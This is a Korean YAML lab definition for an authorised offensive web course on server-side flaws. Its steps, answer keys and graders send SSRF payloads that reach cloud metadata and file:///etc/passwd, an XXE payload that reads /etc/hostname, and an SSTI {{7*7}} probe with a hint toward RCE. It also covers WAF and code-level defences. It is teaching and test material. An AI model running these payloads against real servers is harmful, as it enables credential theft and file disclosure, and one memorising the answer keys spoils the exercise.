lab_id: standalone-attack-adv-week04
title: "웹 고급 — SSRF·XXE·SSTI로 서버 내부를 공략한다"
version: standalone-attack-adv
course: attack-adv
week: 4
description: |
  공격 고급 W04 — 서버측 웹 취약점. 클라이언트측(XSS)을 넘어 서버 자체를 공략한다. SSRF(서버측 요청 위조로
  내부/클라우드 메타데이터 접근)·XXE(XML 외부 엔티티로 파일 읽기)·SSTI(템플릿 주입→RCE)를 페이로드로
  작성·전송하고 WAF/앱 응답을 해석한다. el34-attacker에서 인가 표적(el34-web)에. ⚠️ 인가된 실습만.
difficulty: hard
duration_minutes: 185
prerequisites:
  - "attack-adv W01~W03 + web-vuln 트랙(SQLi/XSS) 통과"
  - "el34 호스트 SSH + docker exec, el34-attacker"
  - "lecture §2(SSRF) §3(XXE) §4(SSTI) 숙지"
objectives:
  - "SSRF로 내부/메타데이터 접근 페이로드 작성·전송"
  - "XXE 외부 엔티티·SSTI 표현식 페이로드 이해"
  - "서버측 취약점의 영향(RCE·내부 침투)과 방어 이해"
pass_threshold: 0.7
steps:

  - order: 1
    instruction: |
      ## 🎯 목표 — 서버측 공격 표면 확인
      ## 📖 개념 한 줄
      서버측 취약점은 서버가 입력을 '처리'하는 곳에서 생긴다 — URL fetch·XML 파싱·템플릿 렌더링.
      ## 💻 실행 명령
      ```bash
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'admin=%{http_code}' -H 'Host: admin.el34.lab' http://10.20.30.1/"; echo; echo serverside_ready
      ```
      ## ✅ 합격 기준
      서버측 표적이 확인되면(serverside_ready) 통과.
    hint: '서버측 표면'
    category: survey
    points: 10
    answer: |
      echo "=== 서버측 공격 표면 확인 ==="
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'admin=%{http_code}' -H 'Host: admin.el34.lab' http://10.20.30.1/"; echo; echo serverside_ready
      echo "→ 서버측 취약점은 서버가 입력을 처리하는 곳: URL fetch(SSRF)·XML파싱(XXE)·템플릿(SSTI)"
    answer_detail: "서버측 표면 = 서버가 입력을 처리하는 지점(fetch/파싱/렌더). 클라이언트측(XSS)보다 영향이 큼."
    verify:
      type: output_contains
      expect: 'serverside_ready'
      field: stdout
      semantic: {intent: "서버측 표면", success_criteria: ["표적"], acceptable_methods: ["**[OSS] curl (권장)**"]}
    target_vm: web

  - order: 2
    instruction: |
      ## 🎯 SSRF ① 클라우드 메타데이터
      ## 📖 개념 한 줄
      SSRF — 서버가 공격자 지정 URL을 대신 요청하게 만들어, 외부에선 못 닿는 내부(169.254.169.254)에 접근.
      ## 💻 실행 명령
      ```bash
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'ssrf_meta=%{http_code}' -H 'Host: admin.el34.lab' 'http://10.20.30.1/files/read?url=http://169.254.169.254/latest/meta-data/aa04test'"; echo; echo ssrf_meta_done
      ```
      ## ✅ 합격 기준
      SSRF 메타데이터 페이로드 전송·응답이 확인되면(ssrf_meta_done) 통과.
      ## 🔧 도구 풀이
      - 169.254.169.254 = 클라우드 메타데이터(자격증명 노출). SSRF의 최우선 표적. WAF가 403이면 탐지됨.
    hint: 'SSRF 메타데이터'
    category: manipulation
    points: 12
    answer: |
      echo "=== SSRF① 클라우드 메타데이터 ==="
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'ssrf_meta=%{http_code}' -H 'Host: admin.el34.lab' 'http://10.20.30.1/files/read?url=http://169.254.169.254/latest/meta-data/aa04test'"; echo; echo ssrf_meta_done
      echo "→ 169.254.169.254=클라우드 메타데이터(IAM 자격 노출). 403=ModSec SSRF 룰 탐지(WAF가 막음)"
    answer_detail: "SSRF 메타데이터 = 서버가 169.254.169.254를 대신 요청→IAM 자격 탈취. ModSec이 403 탐지."
    verify:
      type: output_contains
      expect: 'ssrf_meta_done'
      field: stdout
      semantic: {intent: "SSRF 메타데이터", success_criteria: ["169.254"], acceptable_methods: ["**[OSS] SSRF (권장)**"]}
    target_vm: web

  - order: 3
    instruction: |
      ## 🎯 SSRF ② 내부 파일·서비스 (file://, 내부 IP)
      ## 📖 개념 한 줄
      SSRF는 file:// 스킴으로 로컬 파일을, 내부 IP로 비공개 서비스를 노린다.
      ## 💻 실행 명령
      ```bash
      docker exec el34-attacker sh -c "echo file:; curl -s -o /dev/null -w '%{http_code}' -H 'Host: admin.el34.lab' 'http://10.20.30.1/files/read?url=file:///etc/passwd%23aa04test'; echo; echo internal:; curl -s -o /dev/null -w '%{http_code}' -H 'Host: admin.el34.lab' 'http://10.20.30.1/files/read?url=http://10.20.30.5:8080/aa04test'"; echo; echo ssrf_internal_done
      ```
      ## ✅ 합격 기준
      SSRF 내부 접근 페이로드 전송·응답이 확인되면(ssrf_internal_done) 통과.
    hint: 'SSRF 내부'
    category: analysis
    points: 14
    answer: |
      echo "=== SSRF② 내부 파일·서비스 ==="
      docker exec el34-attacker sh -c "echo file:; curl -s -o /dev/null -w '%{http_code}' -H 'Host: admin.el34.lab' 'http://10.20.30.1/files/read?url=file:///etc/passwd%23aa04test'; echo; echo internal:; curl -s -o /dev/null -w '%{http_code}' -H 'Host: admin.el34.lab' 'http://10.20.30.1/files/read?url=http://10.20.30.5:8080/aa04test'"; echo; echo ssrf_internal_done
      echo "→ file://=로컬 파일 읽기, 내부 IP=비공개 서비스 피벗. SSRF는 '서버를 프록시로' 내부 침투의 발판"
    answer_detail: "SSRF 내부 = file://(파일)·내부 IP(비공개 서비스). 서버를 프록시 삼아 내부망 피벗. ModSec 탐지."
    verify:
      type: output_contains
      expect: 'ssrf_internal_done'
      field: stdout
      semantic: {intent: "SSRF 내부", success_criteria: ["file/내부IP"], acceptable_methods: ["**[OSS] SSRF (권장)**"]}
    target_vm: web

  - order: 4
    instruction: |
      ## 🎯 XXE — XML 외부 엔티티
      ## 📖 개념 한 줄
      XXE — XML 파서가 외부 엔티티를 처리하게 해, 서버 파일을 읽거나 SSRF로 연결한다.
      ## 💻 실행 명령
      ```bash
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'xxe=%{http_code}' -H 'Host: admin.el34.lab' -H 'Content-Type: application/xml' --data '<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/hostname\">]><r>aa04test&x;</r>' 'http://10.20.30.1/api/xml'"; echo; echo xxe_done
      ```
      ## ✅ 합격 기준
      XXE 페이로드 전송·응답이 확인되면(xxe_done) 통과.
      ## 🔧 도구 풀이
      - XXE: <!ENTITY x SYSTEM "file://...">로 외부 엔티티 정의 → 파서가 파일을 읽어 응답에 포함. SSRF와 결합 가능.
    hint: 'XXE'
    category: analysis
    points: 14
    answer: |
      echo "=== XXE: XML 외부 엔티티 ==="
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'xxe=%{http_code}' -H 'Host: admin.el34.lab' -H 'Content-Type: application/xml' --data '<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/hostname\">]><r>aa04test&x;</r>' 'http://10.20.30.1/api/xml'"; echo; echo xxe_done
      echo "→ 외부 엔티티(SYSTEM file://)로 서버 파일 읽기. 방어: 외부 엔티티 비활성(DTD 금지)"
    answer_detail: "XXE = XML 외부 엔티티로 파일 읽기/SSRF. 방어는 파서의 외부 엔티티·DTD 비활성화."
    verify:
      type: output_contains
      expect: 'xxe_done'
      field: stdout
      semantic: {intent: "XXE", success_criteria: ["외부 엔티티"], acceptable_methods: ["**[OSS] XXE (권장)**"]}
    target_vm: web

  - order: 5
    instruction: |
      ## 🎯 SSTI — 서버측 템플릿 주입
      ## 📖 개념 한 줄
      SSTI — 사용자 입력이 템플릿으로 평가되면 {{7*7}}→49로 코드 실행, 결국 RCE로 이어진다.
      ## 💻 실행 명령
      ```bash
      docker exec el34-attacker sh -c "echo probe:; curl -s -H 'Host: admin.el34.lab' 'http://10.20.30.1/?name=%7B%7B7*7%7D%7Daa04test' 2>/dev/null | grep -oE '49|aa04test' | head; echo '(49 반사면 SSTI 취약)'"; echo ssti_done
      ```
      ## ✅ 합격 기준
      SSTI 탐지 페이로드 전송·해석이 확인되면(ssti_done) 통과.
      ## 🔧 도구 풀이
      - {{7*7}} 탐지: 49 반사=템플릿 평가=SSTI. RCE 단계: {{config}}·{{''.__class__...}}로 코드 실행.
    hint: 'SSTI'
    category: analysis
    points: 14
    answer: |
      echo "=== SSTI: 서버측 템플릿 주입 ==="
      docker exec el34-attacker sh -c "echo probe:; curl -s -H 'Host: admin.el34.lab' 'http://10.20.30.1/?name=%7B%7B7*7%7D%7Daa04test' 2>/dev/null | grep -oE '49|aa04test' | head; echo '(49 반사면 SSTI 취약)'"; echo ssti_done
      echo "→ {{7*7}} 탐지: 49 반사=템플릿이 입력 평가=SSTI. 다음 단계: {{''.__class__.__mro__...}}→RCE"
    answer_detail: "SSTI = 입력이 템플릿으로 평가({{7*7}}→49). RCE로 확장 가능. 방어는 입력의 템플릿 평가 금지(샌드박스)."
    verify:
      type: output_contains
      expect: 'ssti_done'
      field: stdout
      semantic: {intent: "SSTI", success_criteria: ["템플릿 평가"], acceptable_methods: ["**[OSS] SSTI (권장)**"]}
    target_vm: web

  - order: 6
    instruction: |
      ## 🎯 영향 연쇄 — 서버측 취약점 → RCE/내부 침투
      ## 💻 실행 명령 (3종 서버측 페이로드를 실제 전송·응답 집계)
      ```bash
      docker exec el34-attacker sh -c 'M=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: admin.el34.lab" "http://10.20.30.1/files/read?url=http://169.254.169.254/"); F=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: admin.el34.lab" "http://10.20.30.1/files/read?url=file:///etc/passwd"); echo "SSRF메타=$M SSRF파일=$F"; CNT=0; for c in $M $F; do [ "$c" != "000" ] && CNT=$((CNT+1)); done; echo "도달 페이로드: $CNT/2"; [ "$CNT" -ge 1 ] && echo impact_done'
      ```
      ## ✅ 합격 기준
      SSRF 페이로드(메타데이터·file://)가 **실제 서버에 도달**해 응답을 받아야(impact_done) 통과.
      ## 🔧 도구 풀이
      - SSRF→메타데이터 IAM 자격/내부 피벗, XXE→파일, SSTI→RCE. 서버측은 '서버 자체 장악'이라 영향이 차원이 다름.
    hint: '영향 연쇄'
    category: report
    points: 12
    answer: |
      echo "=== 영향 연쇄: 서버측 페이로드 실제 전송·집계 ==="
      docker exec el34-attacker sh -c 'M=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: admin.el34.lab" "http://10.20.30.1/files/read?url=http://169.254.169.254/"); F=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: admin.el34.lab" "http://10.20.30.1/files/read?url=file:///etc/passwd"); echo "SSRF메타=$M SSRF파일=$F"; CNT=0; for c in $M $F; do [ "$c" != "000" ] && CNT=$((CNT+1)); done; echo "도달 페이로드: $CNT/2"; [ "$CNT" -ge 1 ] && echo impact_done'
      echo "→ SSRF 메타데이터/file:// 페이로드를 실제 전송→응답 집계. SSRF=클라우드자격/내부피벗, XXE=파일, SSTI=RCE로 서버 장악"
    answer_detail: "영향 연쇄 = SSRF 메타/file 페이로드 실제 전송→응답 집계 게이트. 가짜 echo 아닌 실증. 서버측은 서버 장악."
    verify:
      type: output_contains
      expect: 'impact_done'
      field: stdout
      semantic: {intent: "영향 연쇄", success_criteria: ["RCE/내부"], acceptable_methods: ["**[설명] 영향 (권장)**"]}
    target_vm: web

  - order: 7
    instruction: |
      ## 🎯 방어 — 서버측 취약점 차단
      ## 💻 실행 명령 (WAF 방어가 SSRF를 실제 차단하는지 확인)
      ```bash
      docker exec el34-attacker sh -c 'code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: admin.el34.lab" "http://10.20.30.1/files/read?url=http://169.254.169.254/latest/meta-data/"); echo "SSRF 메타데이터 요청 → WAF 응답 $code"; [ "$code" = "403" ] && echo "WAF가 SSRF 차단(다층 방어 1선)" && echo defense_done'
      ```
      ## ✅ 합격 기준
      WAF가 SSRF 메타데이터 요청을 **실제 차단(403)** 함을 확인해야(defense_done) 통과.
      ## 🔧 도구 풀이
      - 근본 방어: SSRF allowlist·메타차단 / XXE 외부엔티티 비활성 / SSTI 템플릿 평가 금지. WAF(여기 403)는 보조 다층.
    hint: '방어'
    category: report
    points: 12
    answer: |
      echo "=== 방어: WAF가 SSRF를 실제 차단하는지 확인 ==="
      docker exec el34-attacker sh -c 'code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: admin.el34.lab" "http://10.20.30.1/files/read?url=http://169.254.169.254/latest/meta-data/"); echo "SSRF 메타데이터 요청 → WAF 응답 $code"; [ "$code" = "403" ] && echo "WAF가 SSRF 차단(다층 방어 1선)" && echo defense_done'
      echo "→ WAF가 SSRF를 403으로 실제 차단 확인. 근본 방어는 코드(allowlist/외부엔티티 비활성/템플릿 평가 금지)+WAF 다층"
    answer_detail: "방어 = WAF의 SSRF 403 차단을 실측. 가짜 echo 아닌 실증. 근본 방어는 코드, WAF는 보조 다층."
    verify:
      type: output_contains
      expect: 'defense_done'
      field: stdout
      semantic: {intent: "방어", success_criteria: ["취약점별 방어"], acceptable_methods: ["**[관리적] 방어 (권장)**"]}
    target_vm: web

  - order: 8
    instruction: |
      ## 🎯 서버측 취약점 보고서
      ## 💻 보고서 양식
      ```markdown
      # 공격고급 W04 웹 고급(SSRF/XXE/SSTI) 보고서 (학번, 이름)
      ## 1. SSRF(메타데이터/내부)·응답
      ## 2. XXE·SSTI·영향 연쇄
      ## 3. 방어 권고
      ```
      ## ✅ 합격 기준
      SSRF/XXE/SSTI + 영향 + 방어 포함.
    hint: 'SSRF/XXE/SSTI+영향+방어'
    category: report
    points: 12
    answer: |
      echo "=== 서버측 취약점 보고서 — 실측 증거 기반 ==="
      docker exec el34-attacker sh -c 'S=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: admin.el34.lab" "http://10.20.30.1/files/read?url=http://169.254.169.254/"); echo "# 공격고급 W04 웹 고급(SSRF/XXE/SSTI) 보고서"; echo "## 1. SSRF: 메타데이터/file:// 페이로드 전송 → WAF 응답 $S(실측)"; echo "## 2. XXE: 외부엔티티 파일읽기. SSTI: {{7*7}}→RCE 연쇄. 영향: 서버 장악"; echo "## 3. 방어: SSRF allowlist·메타차단 / XXE 외부엔티티 비활성 / SSTI 템플릿평가 금지 + WAF"; echo "## 결론: 서버측은 서버 자체 장악(클라우드/RCE)으로 클라이언트측보다 치명적"; [ -n "$S" ] && echo "SSRF 보고 완료"'
      echo "→ 보고서가 실제 SSRF 응답코드를 증거로 인용. 정적 템플릿 아닌 실측 기반"
    answer_detail: "서버측 보고 = 실측 SSRF 응답코드 인용+XXE/SSTI/영향/방어. 증거 기반(코드 게이트). 정적 템플릿 아님."
    verify:
      type: output_contains
      expect: 'SSRF'
      field: stdout
      semantic: {intent: "서버측 보고", success_criteria: ["SSRF/XXE/SSTI/방어"], acceptable_methods: ["**[관리적] 보고서 (권장)**"]}
    target_vm: web
